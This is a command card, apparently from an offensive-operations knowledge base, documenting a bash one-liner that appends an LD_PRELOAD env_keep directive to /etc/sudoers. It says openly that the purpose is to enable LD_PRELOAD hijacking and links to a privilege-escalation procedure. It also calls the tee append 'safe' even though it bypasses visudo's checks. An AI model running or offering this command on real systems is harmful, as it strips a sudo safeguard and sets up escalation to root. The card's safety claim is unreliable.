---
type: command
executor: bash
data: echo "Defaults env_keep += \"LD_PRELOAD\"" | sudo tee -a /etc/sudoers
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - sudo
  - configuration
verified: true
validated: true
---

# add-ld_preload-to-env_keep-in-sudoers

## Command

```bash
echo "Defaults env_keep += \"LD_PRELOAD\"" | sudo tee -a /etc/sudoers
```

## Description

This command appends a line to /etc/sudoers to include LD_PRELOAD in the env_keep list, preserving the variable across sudo executions. Use this when sudo resets environment variables by default, enabling LD_PRELOAD hijacking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Defaults env_keep += "LD_PRELOAD"` | Sudoers directive to preserve LD_PRELOAD | Yes |
| `sudo tee -a /etc/sudoers` | Appends the directive safely (requires sudo access) | Yes |

## Examples

### Basic Usage

```bash
echo "Defaults env_keep += \"LD_PRELOAD\"" | sudo tee -a /etc/sudoers
```

### Verification

```bash
sudo visudo -c
```

## Expected Output

No output if successful (file appended silently). If errors, sudo will prompt for validation. Verify with 'sudo -l | grep env_keep' showing LD_PRELOAD included.

## Related

- [[procedures/linux-privilege-escalation-via-ld_preload-and-nopasswd]]
